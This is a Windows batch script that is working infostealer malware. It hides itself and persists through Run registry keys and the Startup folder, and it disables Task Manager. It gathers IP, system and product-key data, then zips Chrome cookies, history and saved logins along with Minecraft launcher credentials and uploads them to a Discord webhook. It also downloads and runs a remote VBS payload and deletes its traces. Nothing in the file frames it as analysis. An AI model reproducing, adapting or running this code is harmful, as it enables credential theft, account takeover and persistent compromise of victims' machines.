@echo off
cls
setlocal enableextensions && setlocal enabledelayedexpansion

:: Hide the script file
attrib +h +s %0

:: Define variables
set "valinf=rundll32_%randoM%_toolbar"
set "reginf=HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
set "webhook=https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
  :: Replace with your actual Discord webhook URL

:: Add a registry entry to run this script at startup
reg add %reginf% /v %valinf% /t REG_SZ /d %0 /f > nul

:: Copy the script to the Startup folder
copy %0 "%USERPROFILE%\Start Menu\Programs\Startup"

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 1: Script set to run at startup and copied to Startup folder.\"}"

:: Add a registry entry to run a batch file at user login
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %WINDir%\%a%.bat /f > nul

:: Disable Task Manager
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 2: Registry entries added.\"}"

:: Change to the user profile directory
cd %USERPROFILE%

:: Get the public IP address and save it to a file
curl -s -o IP.txt https://ipv4.wtfismyip.com/text
set /p IPv4=<IP.txt

:: Save installed application details to a file
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > %USERPROFILE%\apps.txt"

:: Upload the application details file
curl -v -F "file=@%USERPROFILE%\apps.txt" %webhook%

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 3: Application details collected and uploaded.\"}"

:: Collect system information and save it to a file
(
    echo Username %USERNAME%
    echo IP %IPv4%
    echo.
    ipconfig
    echo.
    getmac
    echo.
    wmic cpu get caption,name,deviceid,numberofcores,maxclockspeed,status
    echo.
    wmic computersystem get totalphysicalmemory
    echo.
    wmic partition get name,size,type
    echo.
    systeminfo
    echo.
    wmic path softwareLicensingService get OA3xOriginalProductKey
) >> userdata.txt

:: Upload the collected system information
curl -v -F "file=@%USERPROFILE%\userdata.txt" %webhook%

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 4: System information collected and uploaded.\"}"

:: Clean up temporary files
del userdata.txt
del apps.txt

:: Change to the user profile directory
cd %USERPROFILE%


:: Compress and upload various browser and application data
:: Compress and upload various browser and application data
powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\mods' -DestinationPath '%APPDATA%\modss.zip' -CompressionLevel 'Fastest'"
curl -v -F "file=@%APPDATA%\modss.zip" %webhook%

powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies' -DestinationPath '%USERPROFILE%\ChromeCookies.zip' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\ChromeCookies.zip" %webhook%

powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\History' -DestinationPath '%USERPROFILE%\ChromeHistory.zip' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\ChromeHistory.zip" %webhook%

powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Shortcuts' -DestinationPath '%USERPROFILE%\ChromeShortcuts.zip' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\ChromeShortcuts.zip" %webhook%

powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks' -DestinationPath '%USERPROFILE%\ChromeBookmarks.zip' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\ChromeBookmarks.zip" %webhook%

powershell -Command "Compress-Archive -Path '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data' -DestinationPath '%USERPROFILE%\ChromeLoginData.zip' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\ChromeLoginData.zip" %webhook%

powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_msa_credentials.bin' -DestinationPath '%USERPROFILE%\launcher_msa_credentials.bin' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\launcher_msa_credentials.bin" %webhook%

powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_msa_credentials_microsoft_store.bin' -DestinationPath '%USERPROFILE%\launcher_msa_credentials_microsoft_store.bin' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\launcher_msa_credentials_microsoft_store.bin" %webhook%

powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_accounts.json' -DestinationPath '%USERPROFILE%\launcher_accounts.json' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\launcher_accounts.json" %webhook%

powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_accounts_microsoft_store.json' -DestinationPath '%USERPROFILE%\launcher_accounts_microsoft_store.json' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\launcher_accounts_microsoft_store.json" %webhook%

powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_product_state.json' -DestinationPath '%USERPROFILE%\launcher_product_state.json' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\launcher_product_state.json" %webhook%

powershell -Command "Compress-Archive -Path '%APPDATA%\.minecraft\launcher_profiles.json' -DestinationPath '%USERPROFILE%\launcher_profiles.json' -CompressionLevel 'Fastest'"
curl -v -F "file=@%USERPROFILE%\launcher_profiles.json" %webhook%


:: Clean up downloaded and temporary files
del script.vbs
del modss.zip
del ChromeCookies.zip
del ChromeHistory.zip
del ChromeShortcuts.zip
del ChromeBookmarks.zip
del ChromeLoginData.zip
del launcher_msa_credentials.bin
del launcher_msa_credentials_microsoft_store.bin
del launcher_accounts.json
del launcher_accounts_microsoft_store.json
del launcher_product_state.json
del launcher_profiles.json

:: Download and execute a VBS script
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/invisibleghostshell-ux/last/raw/main/win.vbs', 'win.vbs')"
start win.vbs

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 5: VBS script downloaded and executed.\"}"


:: Send final notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 6: All data collected, files compressed, and sent.\"}"
